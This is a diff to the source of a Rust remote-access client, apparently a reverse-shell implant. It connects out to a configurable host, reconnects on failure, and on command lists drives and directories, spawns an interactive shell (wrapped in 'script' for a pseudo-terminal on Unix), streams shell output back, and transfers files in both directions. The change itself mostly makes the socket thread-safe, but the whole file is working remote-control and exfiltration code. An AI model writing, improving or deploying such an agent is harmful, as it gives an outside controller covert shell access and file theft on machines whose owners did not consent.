@@ -5,6 +5,7 @@ use std::fs::File;
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::process::{Child, Command, Stdio};
+use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::{Duration, UNIX_EPOCH};
 
@@ -29,7 +30,7 @@ fn main() {
     let addr = format!("{}:{}", host, port);
     loop {
         eprintln!("[*] connecting to {} ...", addr);
-        let mut stream = match TcpStream::connect(&addr) {
+        let stream = match TcpStream::connect(&addr) {
             Ok(s) => s,
             Err(e) => {
                 eprintln!("[!] connect: {} (retry in {}s)", e, RECONNECT_DELAY);
@@ -39,10 +40,15 @@ fn main() {
         };
 
         eprintln!("[*] connected to {}", addr);
+        let stream = Arc::new(Mutex::new(stream));
         let mut shell: Option<Child> = None;
 
         loop {
-            let frame = match read_frame(&mut stream) {
+            let frame = {
+                let mut s = stream.lock().unwrap();
+                read_frame(&mut *s)
+            };
+            let frame = match frame {
                 Ok(f) => f,
                 Err(e) => {
                     eprintln!("[!] connection lost: {} (reconnecting in {}s)", e, RECONNECT_DELAY);
@@ -53,20 +59,23 @@ fn main() {
             match frame {
                 Frame::Msg(msg) => match msg {
                     Message::ListDir(path) => {
-                        handle_list_dir(&mut stream, &path);
+                        handle_list_dir(&stream, &path);
                     }
                     Message::StartShell => {
                         if shell.is_some() {
-                            let _ = write_msg(&mut stream, &Message::Error("shell already running".into()));
+                            let mut s = stream.lock().unwrap();
+                            let _ = write_msg(&mut *s, &Message::Error("shell already running".into()));
                             continue;
                         }
-                        match spawn_shell(&mut stream) {
+                        match spawn_shell(&stream) {
                             Ok(child) => {
                                 shell = Some(child);
-                                let _ = write_msg(&mut stream, &Message::Success);
+                                let mut s = stream.lock().unwrap();
+                                let _ = write_msg(&mut *s, &Message::Success);
                             }
                             Err(e) => {
-                                let _ = write_msg(&mut stream, &Message::Error(format!("spawn: {}", e)));
+                                let mut s = stream.lock().unwrap();
+                                let _ = write_msg(&mut *s, &Message::Error(format!("spawn: {}", e)));
                             }
                         }
                     }
@@ -75,7 +84,8 @@ fn main() {
                             let _ = c.kill();
                             let _ = c.wait();
                         }
-                        let _ = write_msg(&mut stream, &Message::Success);
+                        let mut s = stream.lock().unwrap();
+                        let _ = write_msg(&mut *s, &Message::Success);
                     }
                     Message::CmdInput(line) => {
                         if let Some(ref mut c) = shell {
@@ -86,20 +96,23 @@ fn main() {
                         }
                     }
                     Message::DownloadRequest(path) => {
-                        if let Err(e) = handle_download(&mut stream, &path) {
-                            let _ = write_msg(&mut stream, &Message::FileError(format!("{}", e)));
+                        if let Err(e) = handle_download(&stream, &path) {
+                            let mut s = stream.lock().unwrap();
+                            let _ = write_msg(&mut *s, &Message::FileError(format!("{}", e)));
                         }
                     }
                     Message::UploadRequest(path) => {
-                        if let Err(e) = handle_upload(&mut stream, &path) {
-                            let _ = write_msg(&mut stream, &Message::FileError(format!("{}", e)));
+                        if let Err(e) = handle_upload(&stream, &path) {
+                            let mut s = stream.lock().unwrap();
+                            let _ = write_msg(&mut *s, &Message::FileError(format!("{}", e)));
                         }
                     }
                     Message::Exit => break,
                     _ => {}
                 },
                 Frame::Chunk(_) => {
-                    let _ = write_msg(&mut stream, &Message::Error("unexpected file chunk".into()));
+                    let mut s = stream.lock().unwrap();
+                    let _ = write_msg(&mut *s, &Message::Error("unexpected file chunk".into()));
                 }
             }
         }
@@ -113,7 +126,7 @@ fn main() {
     }
 }
 
-fn handle_list_dir(stream: &mut TcpStream, path: &str) {
+fn handle_list_dir(stream: &Arc<Mutex<TcpStream>>, path: &str) {
     let entries = if path.is_empty() || path == "::drives" {
         get_drives()
     } else {
@@ -137,13 +150,15 @@ fn handle_list_dir(stream: &mut TcpStream, path: &str) {
                 })
                 .collect::<Vec<_>>(),
             Err(e) => {
-                let _ = write_msg(stream, &Message::FileError(format!("read_dir: {}", e)));
+                let mut s = stream.lock().unwrap();
+                let _ = write_msg(&mut *s, &Message::FileError(format!("read_dir: {}", e)));
                 return;
             }
         }
     };
 
-    let _ = write_msg(stream, &Message::DirEntries(entries));
+    let mut s = stream.lock().unwrap();
+    let _ = write_msg(&mut *s, &Message::DirEntries(entries));
 }
 
 #[cfg(target_os = "windows")]
@@ -230,8 +245,16 @@ fn parse_args() -> Result<(String, u16), String> {
 
 // ── Shell lifecycle ──
 
-fn spawn_shell(main_stream: &mut TcpStream) -> Result<Child, io::Error> {
+fn spawn_shell(main_stream: &Arc<Mutex<TcpStream>>) -> Result<Child, io::Error> {
+    #[cfg(target_os = "windows")]
     let mut child = Command::new(SHELL)
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()?;
+    #[cfg(not(target_os = "windows"))]
+    let mut child = Command::new("script")
+        .args(["-q", "-c", SHELL, "/dev/null"])
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
@@ -240,36 +263,38 @@ fn spawn_shell(main_stream: &mut TcpStream) -> Result<Child, io::Error> {
     let stdout = child.stdout.take().unwrap();
     let stderr = child.stderr.take().unwrap();
 
-    let w1 = main_stream.try_clone()?;
-    let w2 = main_stream.try_clone()?;
+    let s1 = main_stream.clone();
+    let s2 = main_stream.clone();
 
-    thread::spawn(move || pipe_output(w1, stdout, true));
-    thread::spawn(move || pipe_output(w2, stderr, false));
+    thread::spawn(move || pipe_output(s1, stdout, true));
+    thread::spawn(move || pipe_output(s2, stderr, false));
 
     Ok(child)
 }
 
-fn pipe_output(mut stream: TcpStream, mut rdr: impl Read + Send + 'static, send_close: bool) {
+fn pipe_output(stream: Arc<Mutex<TcpStream>>, mut rdr: impl Read + Send + 'static, send_close: bool) {
     let mut buf = [0u8; 4096];
     loop {
         match rdr.read(&mut buf) {
             Ok(0) | Err(_) => break,
             Ok(n) => {
                 let text = String::from_utf8_lossy(&buf[..n]).into_owned();
-                if write_msg(&mut stream, &Message::CmdOutput(text)).is_err() {
+                let mut s = stream.lock().unwrap();
+                if write_msg(&mut *s, &Message::CmdOutput(text)).is_err() {
                     break;
                 }
             }
         }
     }
     if send_close {
-        let _ = write_msg(&mut stream, &Message::ShellClosed);
+        let mut s = stream.lock().unwrap();
+        let _ = write_msg(&mut *s, &Message::ShellClosed);
     }
 }
 
 // ── File transfer ──
 
-fn handle_download(stream: &mut TcpStream, path: &str) -> Result<(), io::Error> {
+fn handle_download(stream: &Arc<Mutex<TcpStream>>, path: &str) -> Result<(), io::Error> {
     let mut file = File::open(path)?;
     let total_size = file.metadata()?.len();
     let mut offset = 0u64;
@@ -282,26 +307,37 @@ fn handle_download(stream: &mut TcpStream, path: &str) -> Result<(), io::Error> 
         }
         buf.truncate(n);
         let is_last = (offset + n as u64) >= total_size;
-        write_chunk(stream, &FileChunk { total_size, offset, is_last, data: buf })?;
+        {
+            let mut s = stream.lock().unwrap();
+            write_chunk(&mut *s, &FileChunk { total_size, offset, is_last, data: buf })?;
+        }
         offset += n as u64;
         if is_last {
             break;
         }
     }
 
-    match read_frame(stream)? {
+    let mut s = stream.lock().unwrap();
+    match read_frame(&mut *s)? {
         Frame::Msg(Message::FileDone) | Frame::Msg(Message::Success) => Ok(()),
         Frame::Msg(Message::FileError(e)) => Err(io::Error::new(io::ErrorKind::Other, e)),
         _ => Err(io::Error::new(io::ErrorKind::Other, "unexpected response")),
     }
 }
 
-fn handle_upload(stream: &mut TcpStream, path: &str) -> Result<(), io::Error> {
-    write_msg(stream, &Message::FileReady)?;
+fn handle_upload(stream: &Arc<Mutex<TcpStream>>, path: &str) -> Result<(), io::Error> {
+    {
+        let mut s = stream.lock().unwrap();
+        write_msg(&mut *s, &Message::FileReady)?;
+    }
 
     let mut file = File::create(path)?;
     loop {
-        match read_frame(stream)? {
+        let frame = {
+            let mut s = stream.lock().unwrap();
+            read_frame(&mut *s)
+        };
+        match frame? {
             Frame::Chunk(chunk) => {
                 file.write_all(&chunk.data)?;
                 if chunk.is_last {
@@ -317,6 +353,7 @@ fn handle_upload(stream: &mut TcpStream, path: &str) -> Result<(), io::Error> {
             _ => {}
         }
     }
-    write_msg(stream, &Message::Success)?;
+    let mut s = stream.lock().unwrap();
+    write_msg(&mut *s, &Message::Success)?;
     Ok(())
 }
